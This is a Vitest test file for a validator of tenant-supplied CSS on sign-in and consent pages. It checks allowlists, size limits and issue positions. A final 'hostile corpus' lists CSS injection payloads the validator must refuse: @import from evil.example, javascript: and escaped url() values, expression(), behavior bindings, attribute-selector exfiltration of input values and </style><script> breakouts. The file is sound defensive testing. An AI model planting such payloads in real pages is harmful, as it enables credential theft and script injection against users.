import { describe, expect, it } from 'vitest';
import { CSS_HOOKS } from '#/service/hooks';
import { checkStylesheet, type StylesheetIssue } from '#/service/stylesheet';

// Catches only a catastrophic regression: an uncapped parse costs seconds,
// so 2 s sits far above the capped path and tolerates a loaded runner.
const CATASTROPHIC_MS = 2000;

const ASSET = '/t/assets/0a1b2c3d.png';
const options = { isAssetUrl: (url: string): boolean => url === ASSET };

const LONE_SURROGATE = /[\ud800-\udbff](?![\udc00-\udfff])|(?<![\ud800-\udbff])[\udc00-\udfff]/;

const codes = (css: string, opts?: Parameters<typeof checkStylesheet>[1]): string[] =>
  checkStylesheet(css, opts).map((issue) => issue.code);

const first = (css: string): StylesheetIssue => {
  const issue = checkStylesheet(css)[0];
  if (issue === undefined) throw new Error(`accepted: ${css}`);
  return issue;
};

describe('checkStylesheet: accepted', () => {
  it('accepts a realistic tenant stylesheet', () => {
    const css = `
/* brand */
.page-sign-in { background-color: #f4f1ea; color: rgb(20, 20, 20); }
.page-sign-in h1 { font-family: 'IBM Plex Sans', system-ui, sans-serif; font-size: 22px; letter-spacing: 0.02em; }
.brand .wordmark, .brand .mark { margin: 0 0 16px; padding: 4px 8px; }
button { background-color: var(--ink-primary); border-radius: 6px; border: 1px solid #333; cursor: pointer; }
button:hover, button:focus-visible { background-color: hsl(210, 40%, 30%); outline: 2px solid #06c; outline-offset: 2px; }
button.secondary { background: transparent; }
input::placeholder { color: currentColor; opacity: 0.7; }
label > input + small { display: block; }
.alert::before { content: ""; }
.page { background-image: url(${ASSET}); background-size: cover; background-repeat: no-repeat; }
@media (prefers-color-scheme: dark) { .page-sign-in { background-color: #111; color: #eee; } }
@media (min-width: 40em) and (max-width: 80rem) { main { max-width: 480px; } }
@media (prefers-reduced-motion: reduce) { a { text-decoration: underline; } }
`;
    expect(checkStylesheet(css, options)).toEqual([]);
  });

  it('accepts an empty stylesheet and comments only', () => {
    expect(checkStylesheet('')).toEqual([]);
    expect(checkStylesheet('/* nothing */')).toEqual([]);
  });

  it('accepts a url only for an allowed asset URL', () => {
    const css = `.page { background-image: url("${ASSET}"); }`;
    expect(checkStylesheet(css, options)).toEqual([]);
    expect(codes(css)).toEqual(['url-not-allowed']);
    expect(codes(`.page { background-image: url(/other.png); }`, options)).toEqual([
      'url-not-allowed',
    ]);
  });

  it('accepts every hook class', () => {
    for (const hook of CSS_HOOKS) expect(checkStylesheet(`.${hook} { color: red; }`)).toEqual([]);
  });
});

describe('checkStylesheet: at-rules', () => {
  it.each([
    ['@import url(//x.example/a.css);'],
    ['@import "//x.example/a.css";'],
    ['@font-face { font-family: x; src: url(//x/f.woff2); }'],
    ['@namespace url(http://www.w3.org/1999/xhtml);'],
    ['@charset "utf-8";'],
    ['@keyframes spin { from { color: red; } }'],
    ['@supports (display: grid) { a { color: red; } }'],
    ['@layer base { a { color: red; } }'],
    ['@container (min-width: 1px) { a { color: red; } }'],
    ['@property --x { syntax: "*"; inherits: false; }'],
    ['@page { margin: 0; }'],
    ['@scope (.page) { a { color: red; } }'],
    ['@starting-style { a { color: red; } }'],
    ['@counter-style x { system: cyclic; }'],
    ['@font-feature-values X { }'],
    ['@document url(//x) { a { color: red; } }'],
    ['@unknown-thing x;'],
    ['@IMPORT "//x";'],
  ])('refuses %s', (css) => {
    expect(codes(css)).toContain('at-rule-not-allowed');
  });

  it('refuses an escaped at-rule name, which the parser cannot read', () => {
    const issue = first('@\\69mport "x";');
    expect(issue.code).toBe('unparsable');
  });

  it('refuses @media nested in @media', () => {
    expect(
      codes('@media (min-width: 1px) { @media (min-width: 2px) { a { color: red; } } }'),
    ).toEqual(['at-rule-not-allowed']);
  });

  it('refuses a comment inside a media query; one at either end is harmless', () => {
    expect(codes('@media (min-width: /**/ 1px) { a { color: red; } }')).toEqual([
      'media-query-not-allowed',
    ]);
    expect(codes('@media /**/ (min-width: 1px) { a { color: red; } }')).toEqual([]);
  });

  it('refuses an at-rule nested in @media', () => {
    expect(codes('@media (min-width: 1px) { @import "x"; }')).toContain('at-rule-not-allowed');
  });

  it.each([
    '@media screen { a { color: red; } }',
    '@media (min-width: 1px) or (max-width: 9px) { a { color: red; } }',
    '@media (hover: hover) { a { color: red; } }',
    '@media (min-width: 40vw) { a { color: red; } }',
    '@media (prefers-color-scheme: sepia) { a { color: red; } }',
    '@media not (min-width: 1px) { a { color: red; } }',
    '@media (min-width: 1px) and { a { color: red; } }',
    '@media { a { color: red; } }',
    '@media (min-width: 1px)',
  ])('refuses the media query in %s', (css) => {
    expect(codes(css).length).toBeGreaterThan(0);
  });

  it('reports a media query code with its position', () => {
    expect(first('a { color: red; }\n  @media (hover: hover) { a { color: red; } }')).toEqual({
      code: 'media-query-not-allowed',
      detail: '(hover: hover)',
      line: 2,
      column: 3,
    });
  });
});

describe('checkStylesheet: selectors', () => {
  it.each([
    ['#id { color: red; }'],
    ['input[type=text] { color: red; }'],
    ['* { color: red; }'],
    ['a:not(.page) { color: red; }'],
    ['a:is(.page) { color: red; }'],
    ['a:where(.page) { color: red; }'],
    ['form:has(input) { color: red; }'],
    ['li:nth-child(2) { color: red; }'],
    ['a:visited { color: red; }'],
    ['a::selection { color: red; }'],
    ['a:before { color: red; }'],
    ['a::before:hover { color: red; }'],
    ['a::before b { color: red; }'],
    ['.pa\\ge { color: red; }'],
    ['.page, { color: red; }'],
    ['> a { color: red; }'],
    ['a > { color: red; }'],
    ['a > > b { color: red; }'],
    ['a/**/b { color: red; }'],
    ['.page& { color: red; }'],
    ['& a { color: red; }'],
    ['marquee { color: red; }'],
    ['html { color: red; }'],
    ['body { color: red; }'],
    ['.pagé { color: red; }'],
  ])('refuses the selector in %s', (css) => {
    expect(codes(css)).toContain('selector-not-allowed');
  });

  it('refuses a class that is not a published hook', () => {
    expect(first('.nope { color: red; }')).toEqual({
      code: 'unknown-class',
      detail: 'nope',
      line: 1,
      column: 1,
    });
  });

  it('accepts descendant, child, sibling combinators, pseudos and elements', () => {
    const css =
      'main > h1 + p ~ ul li a:hover, input:focus, input:disabled, li:first-child, li:last-child ' +
      '{ color: red; } ' +
      'input:checked, button:active, button:focus-visible, p::before, p::after, input::placeholder ' +
      '{ color: red; }';
    expect(checkStylesheet(css)).toEqual([]);
  });

  it('refuses a selector longer than 200 characters', () => {
    const long = `${'main '.repeat(41)}a`;
    expect(codes(`${long} { color: red; }`)).toContain('too-long');
  });

  it('refuses more than 10 selectors in a list', () => {
    const list = Array.from({ length: 11 }, () => 'a').join(',');
    expect(codes(`${list} { color: red; }`)).toContain('too-long');
    expect(checkStylesheet(`${list.slice(0, -2)} { color: red; }`)).toEqual([]);
  });

  it('refuses nested rules, with or without &', () => {
    expect(codes('a { b { color: red; } }')).toContain('selector-not-allowed');
    expect(codes('a { &:hover { color: red; } }')).toContain('selector-not-allowed');
    expect(codes('a { @media (min-width: 1px) { color: red; } }')).toContain('at-rule-not-allowed');
  });
});

describe('checkStylesheet: properties', () => {
  it.each([
    'behavior: url(x)',
    '-moz-binding: url(x)',
    '-webkit-user-select: none',
    'pointer-events: none',
    'position: fixed',
    'position: absolute',
    'position: sticky',
    'visibility: hidden',
    'top: 0',
    'z-index: 9999',
    'transform: scale(0)',
    'filter: blur(2px)',
    'clip-path: circle(0)',
    'clip: rect(0,0,0,0)',
    'mix-blend-mode: difference',
    'transition: all 1s',
    'animation: x 1s',
    'content: "x"',
    'content: attr(href)',
    '--x: red',
    'font-family: Comic Sans MS',
    'display: contents',
    'overflow: scroll',
    'cursor: url(x), auto',
    'color: red !important',
    '*zoom: 1',
    '_color: red',
    'unknown: 1',
    'b\\65havior: x',
  ])('refuses a property outside the allowlist: %s', (decl) => {
    expect(codes(`a { ${decl}; }`).length).toBeGreaterThan(0);
  });

  it('refuses a property outside the allowlist', () => {
    expect(first('a {\n  pointer-events: none;\n}')).toEqual({
      code: 'property-not-allowed',
      detail: 'pointer-events',
      line: 2,
      column: 3,
    });
  });

  it('refuses display none where it could hide the way to submit', () => {
    const refused = [
      'button',
      'input',
      'form',
      'label',
      'form button',
      'main',
      'div',
      'section',
      'p',
      '.page p',
      '.intro p',
      'button img',
      'form span',
      'label small',
      '.page',
      '.page-sign-in',
      '.secondary',
      '.quiet',
      '.choice',
      '.rules',
      '.alert',
      'small, p',
      'small, .page',
    ];
    for (const selector of refused) {
      expect(codes(`${selector} { display: none; }`), selector).toContain('value-not-allowed');
    }
    const allowed = ['small', '.brand', '.links', 'p.context', '.wordmark', 'img'];
    allowed.push('.logo', '.logo-light', '.logo-dark', '.brand .logo.logo-dark');
    for (const selector of allowed) {
      expect(checkStylesheet(`${selector} { display: none; }`), selector).toEqual([]);
    }
  });

  it('[ODUDU-THEME-CLIENTNAME-01] refuses to hide what could be the consent page naming its client', () => {
    const refused = [
      'h1',
      'header',
      '.intro',
      '.intro h1',
      'header.intro',
      'h1:first-child',
      '.page-consent h1',
      '.page-consent .intro',
      '.brand h1',
      'h1, .page-sign-in h1',
      '.page-sign-in h1, header',
    ];
    for (const selector of refused) {
      for (const declaration of ['display: none', 'font-size: 0', 'height: 0']) {
        expect(codes(`${selector} { ${declaration}; }`), `${selector} ${declaration}`).not.toEqual(
          [],
        );
      }
    }
    const scoped = [
      '.page-sign-in h1',
      '.page-sign-in .intro',
      '.page-reset header',
      '.page-sign-in .intro h1',
      '.page-sign-in h1, .page-reset h1',
    ];
    for (const selector of scoped) {
      expect(checkStylesheet(`${selector} { display: none; }`), selector).toEqual([]);
    }
    expect(checkStylesheet('h1 { color: #333; font-size: 22px; }')).toEqual([]);
  });

  it('refuses a custom property and a var() outside the Instrument tokens', () => {
    expect(codes('a { --x: red; }')).toEqual(['property-not-allowed']);
    expect(codes('a { color: var(--x); }')).toEqual(['value-not-allowed']);
    expect(codes('a { color: var(--ink-primary, red); }')).toEqual(['value-not-allowed']);
    expect(checkStylesheet('a { color: var(--ink-primary); }')).toEqual([]);
  });

  it('refuses root-level declarations', () => {
    expect(first('color: red;')).toEqual({
      code: 'root-declaration',
      detail: 'color',
      line: 1,
      column: 1,
    });
    expect(codes('@media (min-width: 1px) { color: red; }')).toEqual(['root-declaration']);
  });
});

describe('checkStylesheet: values', () => {
  it.each([
    ['background-image: url(https://x.example/a.png)', 'url-not-allowed'],
    ['background-image: url(data:image/png;base64,AAAA)', 'url-not-allowed'],
    ['background-image: URL(//x.example/a.png)', 'url-not-allowed'],
    ['background-image: UrL(//x.example/a.png)', 'url-not-allowed'],
    ['background-image: u\\72l(//x.example/a.png)', 'url-not-allowed'],
    ['background-image: \\75rl(//x.example/a.png)', 'url-not-allowed'],
    ['background-image: image-set("a.png" 1x)', 'url-not-allowed'],
    ['background-image: element(#x)', 'url-not-allowed'],
    ['background-image: cross-fade(url(a), url(b))', 'url-not-allowed'],
    ['background-image: paint(x)', 'url-not-allowed'],
    ['color: expression(alert(1))', 'value-not-allowed'],
    ['width: attr(x)', 'value-not-allowed'],
    ['color: red url(x)', 'url-not-allowed'],
    ['color: \\72 ed', 'value-not-allowed'],
    ['width: 100vw', 'value-not-allowed'],
    ['width: 10pt', 'value-not-allowed'],
    ['margin: -9999px', 'value-not-allowed'],
    ['color: #12', 'value-not-allowed'],
    ['color: calc(1 + 2)', 'value-not-allowed'],
    ['color: "red"', 'value-not-allowed'],
    ['opacity: 0', 'value-not-allowed'],
    ['color: red;;;color: rgb(1,2,3', 'unparsable'],
  ])('refuses %s', (decl, code) => {
    expect(codes(`a { ${decl}; }`)).toContain(code);
  });

  it('judges a function name after decoding escapes and ignoring case', () => {
    expect(codes('a { background: U\\52L(//x); }')).toContain('url-not-allowed');
  });

  it('accepts a url only on background and background-image', () => {
    expect(codes(`a { list-style: url(${ASSET}); }`, options)).toEqual(['url-not-allowed']);
    expect(codes(`a { list-style-type: url(${ASSET}); }`, options)).toEqual(['url-not-allowed']);
    expect(codes(`a { background: url(${ASSET}) no-repeat; }`, options)).toEqual([]);
  });

  it('refuses a url with an escape even where isAssetUrl would take it', () => {
    const any = { isAssetUrl: (): boolean => true };
    expect(codes('a { background: url(java\\73cript:x); }', any)).toEqual(['url-not-allowed']);
    expect(codes('a { background: url(/t/a.png); }', any)).toEqual([]);
  });

  it('refuses functions nested deeper than four levels', () => {
    const nest = (n: number): string => `${'rgb('.repeat(n)}1${')'.repeat(n)}`;
    expect(codes(`a { color: ${nest(4)}; }`)).toEqual([]);
    expect(codes(`a { color: ${nest(5)}; }`)).toEqual(['value-not-allowed']);
  });

  it('accepts deg only inside a colour function', () => {
    expect(codes('a { color: hsl(10deg, 10%, 20%); }')).toEqual([]);
    expect(codes('a { width: 10deg; }')).toEqual(['value-not-allowed']);
  });

  it('keeps every issue detail to 60 characters, on a code point boundary', () => {
    const long = 'a'.repeat(300);
    const inputs = [
      `.page{${long}}`,
      `.${long}{color:red}`,
      `a{color:${long}}`,
      `a{${long}:red}`,
      `@${long} x;`,
      `@media ${'(min-width: 1px) and '.repeat(5)}x {}`,
      `a{color:${'😀'.repeat(40)}}`,
      `a{${'😀'.repeat(40)}:red}`,
    ];
    for (const css of inputs) {
      for (const issue of checkStylesheet(css)) {
        expect(issue.detail.length, css.slice(0, 30)).toBeLessThanOrEqual(60);
        expect(issue.detail).not.toMatch(/[\ud800-\udbff]$/);
      }
    }
    expect(checkStylesheet(`.page{${long}}`)[0]?.code).toBe('unparsable');
  });

  it('cuts a detail at a code point, wherever the cut falls', () => {
    const x = 'x'.repeat(59);
    const inputs = [
      `a{${x}😀:red}`,
      `a{${x}😀y:1;}`,
      `@${'x'.repeat(58)}😀y{}`,
      `@media ${x}😀y{}`,
      `${x}😀y:1;`,
    ];
    for (const css of inputs) {
      const issues = checkStylesheet(css);
      expect(issues.length, css).toBeGreaterThan(0);
      for (const issue of issues) {
        expect(issue.detail.length).toBeLessThanOrEqual(60);
        expect(issue.detail, css).not.toMatch(LONE_SURROGATE);
      }
    }
  });

  // The same bug has come back at every place a detail was cut early, so
  // every shape that echoes tenant text is tried with an astral character
  // at each offset, and the whole detail must stay well-formed and short.
  it('keeps every echoed detail well-formed and at most 60 units, at any offset', () => {
    const shapes = [
      (x: string) => `a{${x}:1}`,
      (x: string) => `a{color:${x}}`,
      (x: string) => `a{color:${x}(1)}`,
      (x: string) => `a{color:rgb(${x})}`,
      (x: string) => `a{color:var(${x})}`,
      (x: string) => `a{color:var(--${x})}`,
      (x: string) => `a{font-family:${x}}`,
      (x: string) => `a{font-family:"${x}"}`,
      (x: string) => `a{display:${x}}`,
      (x: string) => `a{width:1${x}}`,
      (x: string) => `a{content:"${x}"}`,
      (x: string) => `a{background:url(${x})}`,
      (x: string) => `a{background:url("${x}")}`,
      (x: string) => `${x}{color:red}`,
      (x: string) => `.${x}{color:red}`,
      (x: string) => `a ${x}{color:red}`,
      (x: string) => `a:${x}{color:red}`,
      (x: string) => `a::${x}{color:red}`,
      (x: string) => `@${x}{}`,
      (x: string) => `@${x} y;`,
      (x: string) => `@media ${x}{}`,
      (x: string) => `@media (min-width: ${x}){}`,
      (x: string) => `${x}:1;`,
      (x: string) => `a{${x}`,
      (x: string) => `a{b:"${x}`,
      (x: string) => `a{b:url(${x}`,
      (x: string) => `a{${x}}`,
    ];
    for (const astral of ['😀', '𝒳']) {
      for (let offset = 0; offset <= 80; offset += 1) {
        const x = `${'x'.repeat(offset)}${astral}y`;
        for (const shape of shapes) {
          const css = shape(x);
          for (const issue of checkStylesheet(css)) {
            expect(issue.detail.length, css).toBeLessThanOrEqual(60);
            expect(issue.detail, css).not.toMatch(LONE_SURROGATE);
          }
        }
      }
    }
  });

  it('refuses an over-long value', () => {
    expect(codes(`a { color: ${'x'.repeat(4097)}; }`)).toEqual(['too-long']);
  });

  it('refuses !important everywhere', () => {
    expect(codes('a { color: red !important; }')).toEqual(['value-not-allowed']);
  });
});

describe('checkStylesheet: input the parser cannot read', () => {
  it('an input the parser cannot read is refused, not passed through', () => {
    for (const css of [
      'a { color: red;',
      'a { content: "abc }',
      'a { background: url(//x }',
      '<script>alert(1)</script>',
      '</style><img src=x onerror=alert(1)>',
      '<!-- a { color: red } -->',
      'a { color: red } }',
      'a[{color:red}',
    ]) {
      expect(codes(css).length, css).toBeGreaterThan(0);
    }
    expect(first('a { color: red;').code).toBe('unparsable');
  });

  it('refuses a NUL byte and says where', () => {
    expect(first('a { color: red; }\n\u0000')).toEqual({
      code: 'nul-byte',
      detail: 'NUL byte',
      line: 2,
      column: 1,
    });
  });
});

describe('checkStylesheet: positions and caps', () => {
  it('counts columns in UTF-16 code units, as the parser does', () => {
    const issue = first('/* 😀 */ a { pointer-events: none; }');
    expect(issue.line).toBe(1);
    expect(issue.column).toBe(14);
  });

  it('refuses more than 128 KiB, measured in UTF-8 bytes, before parsing', () => {
    const wide = `/* ${'é'.repeat(65 * 1024)} */`;
    expect(wide.length).toBeLessThan(128 * 1024);
    const issues = checkStylesheet(wide);
    expect(issues.map((issue) => issue.code)).toEqual(['too-large']);
    expect(issues[0]?.detail).toContain('bytes');
    expect(codes(`a{color:${'x'.repeat(128 * 1024)}}`)).toEqual(['too-large']);
  });

  it('refuses more than 2000 rules', () => {
    expect(codes('a{color:red}'.repeat(2001))).toContain('too-many-rules');
    expect(checkStylesheet('a{color:red}'.repeat(2000))).toEqual([]);
  });

  it('refuses more than 10,000 declarations', () => {
    const rule = (n: number): string => `a{${'color:red;'.repeat(n)}}`;
    expect(codes(rule(10_001))).toContain('too-many-declarations');
    expect(checkStylesheet(rule(10_000))).toEqual([]);
  });

  it('stops at 100 issues', () => {
    const issues = checkStylesheet('a{unknown:1}'.repeat(500));
    expect(issues).toHaveLength(100);
    expect(issues[99]?.code).toBe('too-many-issues');
  });

  it('refuses pathological input fast, each for its own reason', () => {
    const inputs: [string, string][] = [
      [`${'a{'.repeat(32_000)}${'}'.repeat(32_000)}`, 'selector-not-allowed'],
      ['a{'.repeat(32_000), 'unparsable'],
      [`${'a,'.repeat(60_000)}a{color:red}`, 'too-long'],
      ['a{}'.repeat(40_000), 'too-many-rules'],
      [`a{color:${'x'.repeat(128 * 1024)}}`, 'too-large'],
      [`a{color:${'('.repeat(60_000)}}`, 'unparsable'],
      [`@media ${'('.repeat(60_000)}{}`, 'at-rule-not-allowed'],
    ];
    for (const [css, code] of inputs) {
      const started = performance.now();
      expect(checkStylesheet(css)[0]?.code).toBe(code);
      expect(performance.now() - started).toBeLessThan(CATASTROPHIC_MS);
    }
  });
});

describe('[ODUDU-THEME-CSSINJECT-01] checkStylesheet: hostile corpus', () => {
  const payloads = [
    '@import url(//evil.example/x.css);',
    '@import "//evil.example/x.css" screen;',
    '@IMPORT url(//evil.example/x.css);',
    '@\\69mport "//evil.example/x.css";',
    '@i\\6dport "//evil.example/x.css";',
    '@/**/import "//x";',
    'a { background: url(javascript:alert(1)); }',
    'a { background: url("javascript:alert(1)"); }',
    'a { background: url(java\\73cript:alert(1)); }',
    'a { background: ur/**/l(//x); }',
    'a { background: u\\72l(//x); }',
    'a { background: \\75rl(//x); }',
    'a { background: U\\52L("//x"); }',
    'a { background: URL(//x); }',
    'a { background: url( "//x" ); }',
    'a { background: url(data:text/html,<script>alert(1)</script>); }',
    'a { background-image: image-set("//x" 1x); }',
    'a { width: expression(alert(1)); }',
    'a { width: expr/**/ession(alert(1)); }',
    'a { width: e\\78pression(alert(1)); }',
    'a { color: red; behavior: url(x.htc); }',
    'a { -moz-binding: url(//x#y); }',
    'a { -m\\6fz-binding: url(//x#y); }',
    'a { b\\65havior: url(x.htc); }',
    'a { color: red; } } body { background: url(//x); }',
    'a { color: red; } } @import "//x"; a {',
    'a { color: red } b { background: url(//x) }',
    'a { b { background: url(//x); } }',
    'a { &:hover { color: red; } }',
    'input[value^=a] { background: url(//x?a); }',
    'input[value^="a"] { color: red; }',
    'a[href^="https://x"] { color: red; }',
    'form:has(input:checked) { color: red; }',
    'a:not(.page) { color: red; }',
    'a:is(.page, .brand) { color: red; }',
    '#login { color: red; }',
    '* { color: red; }',
    '.page\\:x { color: red; }',
    '.\\70age { color: red; }',
    '@media (min-width: 1px) and (unknown: 1) { a { color: red; } }',
    '@media (min-resolution: 2dppx) { a { color: red; } }',
    '@media (min-width: expression(1)) { a { color: red; } }',
    '@supports (display: grid) { a { color: red; } }',
    '@font-face { font-family: x; src: url(//x/f.woff); }',
    '@namespace svg url(http://www.w3.org/2000/svg);',
    '@charset "utf-7";',
    '@keyframes x { from { color: red } }',
    'a { animation: x 1s; }',
    'a { position: fixed; inset: 0; }',
    'a { position: fixed; top: 0; left: 0; width: 100%; height: 100%; }',
    'a { visibility: hidden; }',
    'button { display: none; }',
    'a { content: url(//x); }',
    'a::before { content: attr(data-x); }',
    'a { --x: url(//x); }',
    'a { color: var(--x); }',
    'a { background: var(--x, url(//x)); }',
    'a { color: red !important; }',
    'a { color: red; \u0000 }',
    '\u0000@import "x";',
    '<style>a{color:red}</style>',
    '</style><script>alert(1)</script>',
    'a { color: red; }</style><script>alert(1)</script>',
    '<!-- --> a { background: url(//x); }',
    'color: red',
    'a { color: red',
    'a { content: "unterminated }',
    'a { background: url(//x }',
    'a { font-family: "IBM Plex Sans", Comic Sans MS; }',
    'a { font-family: url(//x); }',
    'a { cursor: url(//x), pointer; }',
    'a { filter: url(#x); }',
    'a { clip-path: url(#x); }',
    'a { list-style: url(//x); }',
    'a { border-image: url(//x) 1; }',
    'a { mask: url(//x); }',
    'a { color: \\72 \\65 \\64 !important; }',
  ];

  it('has at least 30 payloads', () => {
    expect(payloads.length).toBeGreaterThanOrEqual(30);
  });

  it.each(payloads)('refuses %j', (css) => {
    expect(checkStylesheet(css, options).length).toBeGreaterThan(0);
  });
});
